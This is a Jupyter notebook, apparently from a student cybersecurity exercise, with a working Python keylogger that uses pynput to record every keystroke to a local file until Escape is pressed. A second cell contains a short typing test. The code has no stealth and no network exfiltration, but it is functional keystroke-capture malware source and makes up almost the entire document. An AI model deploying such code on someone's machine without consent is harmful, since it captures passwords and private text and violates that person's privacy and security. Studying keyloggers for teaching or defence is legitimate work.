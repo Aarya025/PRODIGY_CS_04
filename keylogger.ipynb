{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0535f991-d065-4e7d-bc3b-d9a9e4292362",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "# The file where logged keys will be saved\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "# This function writes the keystroke to the log file\n",
    "def write_to_file(key):\n",
    "    # Open the file in append mode to add each keystroke\n",
    "    with open(log_file, \"a\") as f:\n",
    "        key_str = str(key).replace(\"'\", \"\")  # Remove quotes from the key name\n",
    "        if key == Key.space:\n",
    "            f.write(\" \")  # Write a space for the space key\n",
    "        elif key == Key.enter:\n",
    "            f.write(\"\\n\")  # Write a new line for the Enter key\n",
    "        elif key == Key.backspace:\n",
    "            f.write(\"<BACKSPACE>\")  # Log backspace\n",
    "        elif key == Key.tab:\n",
    "            f.write(\"<TAB>\")  # Log tab\n",
    "        elif key == Key.esc:\n",
    "            f.write(\"<ESC>\")  # Log Escape key\n",
    "        else:\n",
    "            f.write(key_str)  # Write other keys as they are\n",
    "\n",
    "# This function starts the keylogger by listening to keystrokes\n",
    "def on_press(key):\n",
    "    write_to_file(key)  # Call the function to log each pressed key\n",
    "\n",
    "# Stop logging when the Escape key is pressed (optional)\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False  # Stop listener\n",
    "\n",
    "# Set up the listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec29555e-a764-4604-b357-3d4129af2b4f",
   "metadata": {},
   "outputs": [],
   "source": [
    "hi my name is aarya"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
